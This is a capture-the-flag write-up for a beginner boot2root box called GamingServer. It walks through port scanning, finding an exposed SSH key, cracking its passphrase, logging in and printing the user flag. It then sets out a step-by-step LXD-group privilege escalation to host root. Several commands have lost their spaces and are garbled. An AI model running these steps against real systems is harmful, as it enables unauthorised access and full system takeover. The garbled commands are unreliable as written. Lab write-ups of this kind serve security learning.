<img width="1910" height="311" alt="image" src="https://github.com/user-attachments/assets/9d3c62a2-5162-46fd-9471-b67a01e399c7" />
GamingServer is Boot2root box for beginner 

### 1. Port Scanning

Started with a full port scan:

```
nmap -sV 10.48.147.5
```

<img width="958" height="226" alt="image" src="https://github.com/user-attachments/assets/9c09e8a5-67dc-4705-a422-05cb820dd2b8" />

Output (relevant ports):

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29
```

No other open ports were discovered.

### 2. Web Enumeration

Check the homepage:

```
curl http://10.48.147.5:80
```

<img width="1103" height="653" alt="image" src="https://github.com/user-attachments/assets/8f034416-bcf4-484c-9403-5b6728b89355" />

Basic HTML template found. Then, use **gobuster** to discover directories:

```
gobuster dir-u http://10.48.147.5-w /usr/share/wordlists/dirb/common.txt
```

<img width="1109" height="461" alt="image" src="https://github.com/user-attachments/assets/90dc64d6-a66b-4fb3-97a5-2b01c92bfe35" />

Discovered directories:

```
/secret
/uploads
```

Check robots.txt:

```
curl http://10.48.147.5/robots.txt
```

<img width="1107" height="102" alt="image" src="https://github.com/user-attachments/assets/886c0901-21ca-4cd9-a465-50e00fe3ce85" />

### 3. File Enumeration & Download

### Secret Directory

```
curl http://10.48.147.5/secret/
```

<img width="1108" height="370" alt="image" src="https://github.com/user-attachments/assets/6dd57bd3-dc7d-4166-aad9-66d5584b6186" />

Found:

```
secretKey
```

### Uploads Directory

```
curl http://10.48.147.5/uploads/
```

<img width="1111" height="432" alt="image" src="https://github.com/user-attachments/assets/ca581f04-d87a-40e0-80d4-eb29ceb9b095" />

Found:

```
dict.lst
manifesto.txt
meme.jpg
```

### Download All Files

```
wget http://10.48.147.5/secret/secretKey
wget http://10.48.147.5/uploads/dict.lst
wget http://10.48.147.5/uploads/manifesto.txt
wget http://10.48.147.5/uploads/meme.jpg
```

<img width="1104" height="634" alt="image" src="https://github.com/user-attachments/assets/d403ca43-4592-41fb-9cc2-09415ef44396" />

### 4. Cracking the SSH Private Key

The file `secretKey` was an **encrypted RSA private key**. Use `ssh2john` to convert it for **John the Ripper**:

```
ssh2john secretKey > key.hash
```

<img width="1111" height="447" alt="image" src="https://github.com/user-attachments/assets/b5276533-006f-4951-8611-8c64231268ae" />

Use the downloaded dictionary (`dict.lst`) to brute-force the passphrase:

```
john--wordlist=dict.lst key.hash
```

<img width="1110" height="224" alt="image" src="https://github.com/user-attachments/assets/cd1e9373-7fc4-462d-89fa-7e305521aea3" />

Check cracked password:

```
john--show key.hash
```

<img width="1105" height="94" alt="image" src="https://github.com/user-attachments/assets/610772e7-fb8c-4b1b-bb78-49071b5f21a5" />

### 5. SSH Login as User

Set proper permissions for the key:

```
chmod600 secretKey
```

<img width="1110" height="540" alt="image" src="https://github.com/user-attachments/assets/14d8a212-7832-4926-b85c-1b7c1e1e4c57" />

Login:

```
ssh-i secretKey john@10.48.147.5
```

Enter passphrase:

```
letmein
```

You now have a shell as user `john`.

## 6. Capture User Flag

List files in home:

```
ls
```

Found `user.txt`. Read it:

<img width="1114" height="90" alt="image" src="https://github.com/user-attachments/assets/24c3aaeb-5cb9-40d8-a51a-109d18b98d35" />

```
cat user.txt
```

**User Flag:**

```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

---

# Privilege Escalation – Getting Root via LXD

---

### 1. Check If User Is in LXD Group

After getting SSH access as `john`, check groups:

```
id
```

or

```
groups
```

If you see:

```
lxd
```

Example:

```
uid=1000(john) gid=1000(john) groups=1000(john),108(lxd)
```

👉 This means you can control containers → **root possible**.

---

### 2. Prepare Working Directory

Go to `/tmp` (writable folder):

```
cd /tmp
mkdir lxdroot
cd lxdroot
```

Create folder structure:

```
mkdir-p rootfs/{bin,lib,lib64,etc,dev,proc,sys,tmp,usr/bin,root,sbin}
```

---

### 3. Copy Bash & Required Libraries

Copy shell:

```
cp /bin/bash rootfs/bin/
cp /bin/sh rootfs/bin/
```

Check dependencies:

```
ldd /bin/bash
```

Example output:

```
libtinfo.so.5
libdl.so.2
libc.so.6
ld-linux-x86-64.so.2
```

Copy them:

```
cp /lib/x86_64-linux-gnu/libtinfo.so.5 rootfs/lib/
cp /lib/x86_64-linux-gnu/libdl.so.2 rootfs/lib/
cp /lib/x86_64-linux-gnu/libc.so.6 rootfs/lib/
cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
```

---

### 4. Create init File (Important)

LXD needs `/sbin/init`.

Create it:

```
mkdir-p rootfs/sbin
nano rootfs/sbin/init
```

Paste inside:

```
#!/bin/sh
mount-t proc proc /proc
mount-t sysfs sysfs /sys
mount-t devtmpfs devtmpfs /dev
exec /bin/bash
```

Save → then:

```
chmod+x rootfs/sbin/init
```

---

### 5. Create metadata.yaml

Create file:

```
nano metadata.yaml
```

Paste:

```
architecture:"x86_64"
creation_date: 1640000000
properties:
  description:"pwn image"
  os:"ubuntu"
  release:"18.04"
```

Save.

---

### 6. Build LXD Image

Create tar file:

```
tar-czf image.tar.gz metadata.yaml rootfs/
```

Check:

```
tar-tzf image.tar.gz
```

You should see:

```
metadata.yaml
rootfs/
```

---

### 7. Import Image into LXD

```
lxc image import image.tar.gz--alias pwn
```

Verify:

```
lxc image list
```

You should see:

```
pwn
```

---

### 8. Create Privileged Container

```
lxc init pwn exploit-c security.privileged=true
```

Mount host filesystem:

```
lxc config device add exploit hostroot disksource=/path=/mntrecursive=true
```

Start container:

```
lxcstart exploit
```

---

### 9. Enter Container

```
lxc exec exploit /bin/bash
```

Now you are inside container as root.

Prompt:

```
bash-4.4#
```

---

### 10. Chroot Into Host System

Inside container, run:

```
/usr/sbin/chroot /mnt
```

Now you are **real host root**.

Check:

```
whoami
```
<img width="1093" height="720" alt="image" src="https://github.com/user-attachments/assets/bb0a7c64-0ea9-451c-84e9-2a9f72a60aef" />
